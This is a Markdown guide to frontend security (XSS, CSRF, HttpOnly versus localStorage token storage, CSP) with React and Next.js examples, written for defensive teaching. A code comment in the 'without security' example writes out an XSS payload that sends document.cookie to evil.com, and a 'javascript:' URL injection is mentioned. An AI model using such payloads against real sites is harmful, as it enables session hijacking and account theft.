# Frontend Security

> A comprehensive guide to frontend security covering XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), secure token storage strategies (HttpOnly Cookies vs. localStorage), and Content Security Policy (CSP). Frontend security vulnerabilities directly target end users and their sessions.

---

## 1. What is it? (What)

**Frontend Security** encompasses the practices and mechanisms used to protect web applications from attacks that exploit the client-side execution environment (browser). Unlike backend security, frontend attacks target the user's browser session, cookies, and personal data.

### Classification
- **Type**: Application security discipline.
- **Primary threats**: XSS, CSRF, clickjacking, token theft, supply chain attacks.
- **Defense layers**: Input sanitization, CSP headers, secure cookie attributes, Subresource Integrity (SRI).

---

## 2. Why does it exist? (Why)

Browsers execute arbitrary JavaScript from any origin that manages to inject it into a page. This trust model creates attack surfaces that backend security alone cannot address:

| Threat | Impact | Frontend responsibility |
|---|---|---|
| XSS (Stored/Reflected/DOM) | Session hijacking, data theft | Sanitize inputs, avoid `innerHTML`, enforce CSP |
| CSRF | Unauthorized actions on behalf of user | Use `SameSite` cookies, anti-CSRF tokens |
| Token theft | Full account takeover | Use `HttpOnly` cookies instead of `localStorage` |
| Clickjacking | User tricked into clicking hidden elements | `X-Frame-Options` / CSP `frame-ancestors` |

---

## 3. Without vs. With Comparison (Compare)

### Without proper security

```typescript
// Vulnerable: renders user-provided HTML directly
function Comment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // If html contains <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
  // the attacker steals every viewer's session cookie
}

// Vulnerable: token in localStorage — accessible to any XSS
localStorage.setItem("token", accessToken);
```

### With proper security

```typescript
import DOMPurify from "dompurify";

// Safe: HTML is sanitized before rendering
function Comment({ html }: { html: string }) {
  const cleanHtml = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

// Safe: token stored in HttpOnly cookie (set by backend)
// JavaScript cannot access HttpOnly cookies — immune to XSS theft
// The browser automatically attaches the cookie to requests
```

| Aspect | Without security | With security |
|---|---|---|
| User HTML rendering | Raw injection (XSS vector) | Sanitized with DOMPurify |
| Token storage | localStorage (XSS accessible) | HttpOnly cookie (JS inaccessible) |
| CSRF protection | None | SameSite cookie + CSRF token |
| Script injection | Unrestricted | CSP restricts allowed sources |

---

## 4. Common Use Cases

1. **User-generated content platforms** — Blog comments, forum posts, rich text editors require XSS sanitization.
2. **Authentication flows** — Secure token storage and automatic token refresh.
3. **Third-party script management** — Analytics, ads, and widgets introduce supply chain risk.
4. **E-commerce checkout** — CSRF protection for payment and order submission forms.
5. **Admin dashboards** — Elevated privileges require defense-in-depth (CSP + strict auth + CSRF).

---

## 5. Deep Practice

### XSS Prevention

1. **React's built-in protection** — JSX expressions `{variable}` are automatically escaped. This prevents basic XSS.
2. **Avoid `dangerouslySetInnerHTML`** — When unavoidable, always sanitize with DOMPurify first.
3. **Never use `innerHTML` in vanilla JS** — Use `textContent` or DOM APIs instead.
4. **Sanitize URL inputs** — User-provided URLs in `href` can execute JavaScript: `javascript:alert(1)`.
5. **Validate on both client and server** — Client-side validation is a UX feature, not a security boundary.

### Secure Token Storage

| Storage | XSS vulnerable | CSRF vulnerable | Recommendation |
|---|---|---|---|
| `localStorage` | Yes — any JS can read it | No | Avoid for sensitive tokens |
| `sessionStorage` | Yes — any JS can read it | No | Avoid for sensitive tokens |
| `HttpOnly` Cookie | No — JS cannot access it | Yes (mitigated by `SameSite`) | **Recommended** |
| In-memory variable | No (unless XSS executes) | No | Good for short-lived access tokens |

**Recommended approach**: Backend sets the access token in an `HttpOnly`, `Secure`, `SameSite=Lax` cookie. The browser automatically attaches it to every request. Frontend JavaScript never handles the token directly.

### CSRF Protection

- **`SameSite=Lax` or `Strict` cookies**: The browser does not send cookies on cross-origin requests from other domains.
- **Anti-CSRF tokens**: Backend generates a unique token per session, embedded in forms as a hidden field. Cross-origin attackers cannot obtain this token.
- **Custom headers**: Require a custom header (e.g., `X-Requested-With`) on all state-changing requests. Browsers enforce CORS preflight for custom headers, blocking cross-origin requests.

### Content Security Policy (CSP)

CSP is an HTTP header that restricts which resources the browser is allowed to load.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com
```

Even if an XSS vulnerability exists, CSP prevents the injected script from loading external resources or exfiltrating data to attacker-controlled domains.

### Best Practices

1. **Use `HttpOnly` cookies for authentication tokens** — Eliminates the primary XSS token theft vector.
2. **Deploy CSP headers in production** — Start with `report-only` mode to avoid breaking functionality.
3. **Never trust client-side input** — All validation must be duplicated on the server.
4. **Use Subresource Integrity (SRI)** for third-party CDN scripts to prevent supply chain attacks.
5. **Audit third-party dependencies** — Run `npm audit` in CI pipelines; use `Socket.dev` or `Snyk` for deep analysis.

### Common Pitfalls

1. **Storing JWTs in localStorage** — The most common frontend security mistake. Any XSS vulnerability exposes the token.
2. **Trusting `dangerouslySetInnerHTML` with unsanitized content** — Directly enables Stored XSS.
3. **CSP too permissive** — `script-src 'unsafe-inline' 'unsafe-eval'` negates CSP's protection entirely.
4. **Forgetting `SameSite` on cookies** — Without it, CSRF attacks are possible.
5. **Not validating `javascript:` URLs** — User-provided URLs in `href` can execute arbitrary code.

### Production Checklist

- [ ] Authentication tokens stored in `HttpOnly`, `Secure`, `SameSite=Lax` cookies.
- [ ] No `dangerouslySetInnerHTML` without DOMPurify sanitization.
- [ ] CSP header deployed (at minimum `default-src 'self'`).
- [ ] `npm audit` integrated into CI pipeline.
- [ ] SRI attributes on all third-party CDN scripts.
- [ ] URL inputs validated against `javascript:` protocol injection.

---

## 6. Code Templates and Integration

### Next.js CSP Configuration

```typescript
// next.config.ts
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' blob: data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
`.replace(/\n/g, "");

const nextConfig = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "Content-Security-Policy", value: cspHeader },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        ],
      },
    ];
  },
};

export default nextConfig;
```

---

## Related Topics

- [API Layer Design](./api-layer-design.md) — Token refresh interceptors and secure HTTP client configuration.
- [App Router & React Server Components](../03-nextjs/app-router-rsc.md) — Server-side authentication with Server Components.
- [Web Security (Fundamentals)](../../01-fundamentals/security/web-security.md) — OWASP Top 10 and foundational security concepts.
